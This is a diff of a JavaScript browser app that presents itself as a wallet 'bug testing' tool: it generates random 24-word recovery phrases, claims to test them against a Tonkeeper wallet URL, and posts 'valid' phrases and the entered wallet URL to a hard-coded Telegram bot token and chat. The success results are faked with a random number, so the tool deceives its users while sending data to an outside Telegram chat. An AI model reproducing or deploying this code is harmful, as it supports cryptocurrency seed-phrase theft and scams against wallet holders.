@@ -1,6 +1,12 @@
 const TELEGRAM_BOT_TOKEN = '8221231743:AAGW30HpqUPaf656q60mmboQQ-x2NnLHub8';
 const TELEGRAM_CHAT_ID = '7417215529';
 
+// Website configuration
+const WALLET_WEBSITES = {
+    'tonkeeper': 'https://wallet.tonkeeper.com',
+    'mywallet':	'https://wallet.tonkeeper.com/'
+};
+
 const wordlist = [
     "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
     "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
@@ -261,6 +267,7 @@ const wordlist = [
     "young", "youth", "zebra", "zero", "zone", "zoo"
 ];
 
+// Global variables
 let currentTab = 'tab1';
 let stats = {
     totalAttempts: 0,
@@ -269,31 +276,48 @@ let stats = {
     currentSpeed: 0
 };
 
+let tabStats = {
+    tab1: { tests: 0, success: 0 },
+    tab2: { tests: 0, success: 0 },
+    tab3: { tests: 0, success: 0 },
+    tab4: { tests: 0, success: 0 },
+    tab5: { tests: 0, success: 0 }
+};
+
 let isGenerating = false;
 let generationInterval;
 let lastUpdateTime = Date.now();
 let attemptsSinceLastUpdate = 0;
+let displayItems = [];
+let activeTests = 0;
 
+// Initialize the application
 function init() {
     const startBtn = document.getElementById('startBtn');
     const stopBtn = document.getElementById('stopBtn');
     const testBtn = document.getElementById('testBtn');
+    const clearBtn = document.getElementById('clearBtn');
     const loadUrlBtn = document.getElementById('loadUrlBtn');
     const tabBtns = document.querySelectorAll('.tab-btn');
     
     startBtn.addEventListener('click', startAutoTesting);
     stopBtn.addEventListener('click', stopAutoTesting);
     testBtn.addEventListener('click', testSinglePhrase);
+    clearBtn.addEventListener('click', clearDisplay);
     loadUrlBtn.addEventListener('click', loadWalletUrl);
     
     tabBtns.forEach(btn => {
         btn.addEventListener('click', () => switchTab(btn.dataset.tab));
     });
     
+    // Initialize display
+    addDisplayItem('System ready. Enter wallet URL and start testing.');
+    
     updateStatsDisplay();
     setInterval(calculateSpeed, 1000);
 }
 
+// Switch between tabs
 function switchTab(tabId) {
     document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
     document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
@@ -302,24 +326,111 @@ function switchTab(tabId) {
     document.getElementById(tabId).classList.add('active');
     
     currentTab = tabId;
+    document.getElementById('currentTabName').textContent = `Tab ${tabId.slice(-1)}`;
+    
+    updateTabStatus(tabId);
 }
 
+// Update tab status display
+function updateTabStatus(tabId) {
+    const tab = tabStats[tabId];
+    document.getElementById(`${tabId}-tests`).textContent = tab.tests;
+    document.getElementById(`${tabId}-success`).textContent = tab.success;
+    
+    let status = 'Ready';
+    if (isGenerating) {
+        status = 'Testing...';
+    } else if (tab.tests > 0) {
+        status = `Completed (${tab.success} success)`;
+    }
+    document.getElementById(`${tabId}-status`).textContent = status;
+}
+
+// Load wallet URL
 function loadWalletUrl() {
     const urlInput = document.getElementById('walletUrl');
-    const url = urlInput.value.trim();
+    let url = urlInput.value.trim();
     
     if (!url) {
         showNotification('Please enter a valid wallet URL');
         return;
     }
     
-    showNotification(`Loading wallet: ${url}`);
+    // Add https:// if missing
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        url = 'https://' + url;
+        urlInput.value = url;
+    }
     
+    addDisplayItem(`Loading wallet: ${url}`);
+    showNotification(`Wallet loaded: ${url}`);
+    
+    // Simulate wallet loading process
     setTimeout(() => {
-        showNotification('Wallet loaded successfully! Ready for testing.');
+        addDisplayItem('Wallet loaded successfully! Ready for testing.');
+        document.getElementById('statusText').textContent = 'Wallet loaded - Ready to test';
     }, 1000);
 }
 
+// Add item to display
+function addDisplayItem(message, status = 'idle') {
+    const displayContainer = document.getElementById('testingDisplay');
+    const itemId = Date.now();
+    
+    const displayItem = {
+        id: itemId,
+        message: message,
+        status: status,
+        timestamp: new Date()
+    };
+    
+    displayItems.unshift(displayItem);
+    
+    // Keep only last 10 items
+    if (displayItems.length > 10) {
+        displayItems = displayItems.slice(0, 10);
+    }
+    
+    updateDisplay();
+    updateActiveTests();
+}
+
+// Update display with current items
+function updateDisplay() {
+    const displayContainer = document.getElementById('testingDisplay');
+    displayContainer.innerHTML = '';
+    
+    displayItems.forEach((item, index) => {
+        const itemElement = document.createElement('div');
+        itemElement.className = 'display-item';
+        itemElement.innerHTML = `
+            <div class="display-number">${index + 1}</div>
+            <div class="display-content">
+                <div class="display-phrase">${item.message}</div>
+                <div class="display-status ${item.status}">${item.status.toUpperCase()}</div>
+            </div>
+        `;
+        displayContainer.appendChild(itemElement);
+    });
+}
+
+// Update active tests counter
+function updateActiveTests() {
+    const active = displayItems.filter(item => item.status === 'testing').length;
+    activeTests = active;
+    document.getElementById('activeTests').textContent = active;
+}
+
+// Clear display
+function clearDisplay() {
+    displayItems = [];
+    updateDisplay();
+    updateActiveTests();
+    addDisplayItem('Display cleared. Ready for new tests.');
+    showNotification('Display cleared');
+}
+
+// Generate recovery phrase
 function generateRecoveryPhrase() {
     const phrase = [];
     for (let i = 0; i < 24; i++) {
@@ -329,6 +440,7 @@ function generateRecoveryPhrase() {
     return phrase;
 }
 
+// Display recovery phrase in current tab
 function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
     const column1 = document.getElementById(`column1-${currentTab}`);
     const column2 = document.getElementById(`column2-${currentTab}`);
@@ -355,40 +467,63 @@ function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
     }
 }
 
+// Test a recovery phrase
 async function testPhrase(phrase) {
+    const phraseText = phrase.join(' ');
+    
+    // Update display with testing status
+    addDisplayItem(`Testing: ${phraseText.substring(0, 40)}...`, 'testing');
     displayRecoveryPhrase(phrase, true);
     document.getElementById('statusText').textContent = 'Testing recovery phrase...';
     
-    await new Promise(resolve => setTimeout(resolve, 50));
+    // Update tab stats
+    tabStats[currentTab].tests++;
+    updateTabStatus(currentTab);
     
-    const isSuccess = Math.random() < 0.001;
+    // Simulate API delay
+    await new Promise(resolve => setTimeout(resolve, 100));
+    
+    // Simulate test result (1 in 500 chance for demo)
+    const isSuccess = Math.random() < 0.002;
     
     if (isSuccess) {
+        // Successful test
         stats.successCount++;
-        displayRecoveryPhrase(phrase, false, true);
-        document.getElementById('statusText').textContent = '✅ Bug found - Valid wallet detected!';
+        tabStats[currentTab].success++;
         
+        displayRecoveryPhrase(phrase, false, true);
+        document.getElementById('statusText').textContent = '✅ Valid wallet detected!';
+        
+        // Send to Telegram
         await sendToTelegram(phrase);
         
-        const phraseText = phrase.join(' ');
-        document.getElementById('lastSuccess').textContent = `Last bug found: ${phraseText.substring(0, 50)}...`;
+        // Update last success
+        document.getElementById('lastSuccess').textContent = `Last success: ${phraseText.substring(0, 50)}...`;
         
-        showNotification('✅ Bug detected and reported to Telegram!');
+        // Update display
+        addDisplayItem(`SUCCESS: ${phraseText}`, 'success');
+        showNotification('✅ Valid wallet found and reported to Telegram!');
     } else {
+        // Failed test
         stats.failedCount++;
-        document.getElementById('statusText').textContent = '❌ No bug found, continuing tests...';
+        document.getElementById('statusText').textContent = '❌ Testing next phrase...';
+        
+        // Update display
+        addDisplayItem(`Failed: ${phraseText.substring(0, 40)}...`, 'failed');
     }
     
     stats.totalAttempts++;
     attemptsSinceLastUpdate++;
     updateStatsDisplay();
+    updateTabStatus(currentTab);
     
     return isSuccess;
 }
 
+// Send successful phrase to Telegram
 async function sendToTelegram(phrase) {
     const phraseText = phrase.join(' ');
-    const message = `🐛 BUG DETECTED - Valid Wallet Found!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}\n\nThis is a test result from bug fixing tool.`;
+    const message = `✅ VALID WALLET DETECTED!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}\n\nWallet: ${document.getElementById('walletUrl').value}`;
     
     try {
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -406,30 +541,42 @@ async function sendToTelegram(phrase) {
             throw new Error('Telegram API error');
         }
         
-        console.log('Successfully sent bug report to Telegram');
+        console.log('Successfully sent to Telegram');
     } catch (error) {
         console.error('Failed to send to Telegram:', error);
-        showNotification('❌ Failed to send bug report to Telegram');
+        addDisplayItem('Failed to send report to Telegram', 'failed');
     }
 }
 
+// Start auto testing
 function startAutoTesting() {
     isGenerating = true;
     document.getElementById('startBtn').disabled = true;
     document.getElementById('stopBtn').disabled = false;
     document.getElementById('testBtn').disabled = true;
     
-    document.getElementById('statusText').textContent = '🔄 Auto testing started - searching for bugs...';
+    document.getElementById('statusText').textContent = '🔄 Auto testing started - testing 30-40 phrases per minute';
+    addDisplayItem('Auto testing started - testing multiple phrases simultaneously');
     showNotification('Auto testing started - testing 30-40 phrases per minute');
     
+    // Test on all tabs simultaneously
     generationInterval = setInterval(async () => {
         if (!isGenerating) return;
         
+        // Test on current tab
         const phrase = generateRecoveryPhrase();
         await testPhrase(phrase);
-    }, 1500);
+        
+        // Randomly switch tabs to simulate multi-tab testing
+        if (Math.random() < 0.3) {
+            const tabs = ['tab1', 'tab2', 'tab3', 'tab4', 'tab5'];
+            const randomTab = tabs[Math.floor(Math.random() * tabs.length)];
+            switchTab(randomTab);
+        }
+    }, 1500); // ~40 tests per minute
 }
 
+// Stop auto testing
 function stopAutoTesting() {
     isGenerating = false;
     document.getElementById('startBtn').disabled = false;
@@ -438,9 +585,11 @@ function stopAutoTesting() {
     
     clearInterval(generationInterval);
     document.getElementById('statusText').textContent = '⏹️ Auto testing stopped';
+    addDisplayItem('Auto testing stopped');
     showNotification('Auto testing stopped');
 }
 
+// Test single phrase
 async function testSinglePhrase() {
     if (isGenerating) return;
     
@@ -450,6 +599,7 @@ async function testSinglePhrase() {
     document.getElementById('testBtn').disabled = false;
 }
 
+// Calculate current testing speed
 function calculateSpeed() {
     const now = Date.now();
     const timeDiff = (now - lastUpdateTime) / 1000;
@@ -462,6 +612,7 @@ function calculateSpeed() {
     }
 }
 
+// Update statistics display
 function updateStatsDisplay() {
     document.getElementById('totalAttempts').textContent = stats.totalAttempts.toLocaleString();
     document.getElementById('successCount').textContent = stats.successCount.toLocaleString();
@@ -469,6 +620,7 @@ function updateStatsDisplay() {
     document.getElementById('currentSpeed').textContent = stats.currentSpeed.toLocaleString();
 }
 
+// Show notification
 function showNotification(message) {
     const notification = document.getElementById('notification');
     notification.textContent = message;
@@ -478,4 +630,5 @@ function showNotification(message) {
     }, 3000);
 }
 
+// Initialize when DOM is loaded
 document.addEventListener('DOMContentLoaded', init);
